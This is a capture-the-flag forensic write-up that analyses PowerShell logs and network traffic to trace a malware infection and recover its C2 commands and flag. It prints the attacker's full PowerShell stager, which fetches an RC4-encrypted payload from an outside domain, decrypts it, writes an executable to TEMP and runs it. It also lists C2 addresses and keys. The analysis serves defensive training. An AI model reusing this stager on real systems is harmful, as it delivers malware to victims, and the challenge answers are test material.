# Masquerade CTF Writeup

This writeup details the steps taken to analyze the provided `Powershell-Operational.evtx` and `traffic.pcapng` files to extract the attacker's payloads, C2 communications, and ultimately the flag.

## 1. Initial Triage & PowerShell Execution Analysis

The first step was to analyze the `Powershell-Operational.evtx` file to understand what was executed on the victim's machine. Since specialized tools like `evtx_dump` were not immediately available, I used `strings` with UTF-16 little-endian encoding (`-e l`) to extract readable strings and `grep` to filter for common PowerShell keywords.

```bash
strings -e l Powershell-Operational.evtx | grep -C 10 "DownloadString" | head -n 50
```

**Findings:**
This revealed an initial PowerShell stager executing the following command:

```powershell
$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''
$b = for($x=0; $x -lt $h.Length; $x+=2) { [Convert]::ToByte($h.Substring($x, 2), 16) }
$s = 0..255
$j = 0
for ($i = 0; $i -lt 256; $i++) {
    $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
    $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
}
$i = $j = 0
$d = foreach ($byte in $b) {
    $i = ($i + 1) % 256
    $j = ($j + $s[$i]) % 256
    $byte -bxor $s[($s[$i] + $s[$j]) % 256]
}
$p = $env:TEMP + '\amdfendrsr.exe'
[System.IO.File]::WriteAllBytes($p, $d)
Start-Process $p
```

From this script, we can answer the first three questions:
1.  **External domain contacted:** `api-edgecloud.xyz`
2.  **Encryption algorithm:** The script implements **RC4** (indicated by the array initialization of 0..255, key scheduling algorithm, and PRGA loop with `bxor`).
3.  **Decryption Key:** `X9vT3pL2QwE8xR6ZkYhC4s`

## 2. Extracting the Second-Stage Payload

Next, I analyzed `traffic.pcapng` to extract the `amd.bin` payload. I filtered for the HTTP response containing `amd.bin` to find the exact TCP stream and extracted the data.

```bash
# Find the TCP stream for the payload download
tshark -r traffic.pcapng -Y "http.request.uri contains \"amd.bin\"" -T fields -e tcp.stream -e http.host -e http.request.uri

# Extract the server response timestamp
tshark -r traffic.pcapng -Y "tcp.stream eq 42 and http.response" -T fields -e http.date
```

**Timestamp of the server response:** `Fri, 10 Apr 2026 05:28:23 GMT`

I then dumped the payload data from the stream, removed line breaks, and converted it from hex.

```bash
tshark -r traffic.pcapng -Y "tcp.stream eq 42 and http.response" -T fields -e http.file_data | tr -d '\n' | xxd -r -p > amd.bin
```

## 3. Decrypting the Payload

Using the RC4 key found in the EVTX file, I wrote a Python script to decrypt `amd.bin` and obtain its SHA-256 hash.

**`decrypt.py`:**
```python
import hashlib

def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    i = j = 0
    res = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        res.append(byte ^ S[(S[i] + S[j]) % 256])
    return res

key = b'X9vT3pL2QwE8xR6ZkYhC4s'
with open('amd.bin', 'r') as f:
    hex_data = f.read().strip()
data = bytes.fromhex(hex_data)

decrypted = rc4(key, data)
with open('decrypted_payload.exe', 'wb') as f:
    f.write(decrypted)

print("SHA256:", hashlib.sha256(decrypted).hexdigest())
```

**SHA-256 Hash:** `e3d39d42df63c6874780737244370ba517820f598fd2443e47ff6580f10c17cb`

## 4. Analyzing the Decrypted Payload

The decrypted file is a .NET executable. By running `strings` on it, I found indicators of its inner workings and C2 details:

```bash
strings -e l decrypted_payload.exe | head -n 100
```

**Key Extractions:**
*   **Encryption Algorithm:** `AesManaged` (AES)
*   **Key/Seed string:** `M4squ3r4d3Th3P4ck3tSt34lthM0d31337`
*   **C2 Server:** `http://34.174.57.99`
*   **C2 URI pattern:** `http://34.174.57.99/images?guid=`
*   **HTML parsing string:** `<!-- {0} oldcss=`

These strings tell us the malware communicates with `http://34.174.57.99/`, uses AES encryption, and parses incoming HTML responses for a hidden comment containing `oldcss=`.

*   **Remote URL client used:** `http://34.174.57.99/`
*   **Client encryption algorithm and key:** **AES** and **M4squ3r4d3Th3P4ck3tSt34lthM0d31337**

## 5. Extracting and Decrypting C2 Commands

By filtering the PCAP for traffic to the C2 server, I found the victim continuously polling the server. Some of the HTTP responses contained the targeted `oldcss` HTML comments:

```bash
tshark -r traffic.pcapng -Y "http.response" -T fields -e http.file_data | xxd -r -p | grep "oldcss"
```

This yielded several Base64-encoded ciphertexts:
*   `LQPZY0C4ZPwZD8K0sFRzQKtP8l0NE35v/EzXkc0lU0Q=`
*   `e/AWYx/120vW/t/o7Dgib7YjCVue1QYc43iF2irBVCkXBSfctKIDrBn3W3R79h9Y`
*   `DjensviPUVe1TnQ6UNXTSZTJ3ECH6v4llUZ8GSbTtNM=`
*   `wrRG31m5pAqBrTdKJH2MV/fmJh0vpuGnsoVmXJzp3GNTR35maQWTtwxGFA1+OKhj/gQpRdiAjjIItrlGio+iUA==`
*   `Ot1LuXsbejCKTUgGHsOHdjI24igTv5FF/SIER1zMN7U=`
*   `ewM6r2+zOT+sjlxdzqz0IZFonQfRisqJjwqJx8EtwBe1UDNeMLCFZbQF9ULp22A5kYU+gCJWLCBlDAVW/P9Z5G/Towi2ILsTUBNgwpnx1Nya9YBGdAbYoux5Hfoynsfb`
*   `y9iDuwodl3alDXAtCAVkE1CBJ4QR7eRtT6TQYSL20hM=`

Using the `AesManaged` class in .NET with a string password typically involves hashing the password to derive a proper 32-byte key for AES-256. The IV is typically prepended to the ciphertext (first 16 bytes). I wrote a Python script to decode these messages using AES-CBC and the SHA-256 hash of the extracted key.

**`aes_decrypt.py`:**
```python
from Crypto.Cipher import AES
import base64
import hashlib

def decrypt(ciphertext_b64, key_str):
    data = base64.b64decode(ciphertext_b64)
    iv = data[:16]
    ciphertext = data[16:]
    
    key = hashlib.sha256(key_str.encode('utf-8')).digest()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        decrypted = cipher.decrypt(ciphertext)
        print(f"Decrypted: {decrypted}")
    except Exception as e:
        pass

key_str = "M4squ3r4d3Th3P4ck3tSt34lthM0d31337"
ciphertexts = [ ... ] # List of extracted base64 strings

for ct in ciphertexts:
    decrypt(ct, key_str)
```

**Decrypted Commands:**
1.  `nothing`
2.  `DESKTOP-I6C5C7M::::whoami /all`
3.  `nothing`
4.  `DESKTOP-I6C5C7M::::ipconfig /all`
5.  `nothing`
6.  `DESKTOP-I6C5C7M::::echo THM{m45k3d_tr4ff1c_0v3r_c0v3rt_ch4nn3lz}`
7.  `nothing`

The final executed command reveals the flag.

**Flag:** `THM{m45k3d_tr4ff1c_0v3r_c0v3rt_ch4nn3lz}`
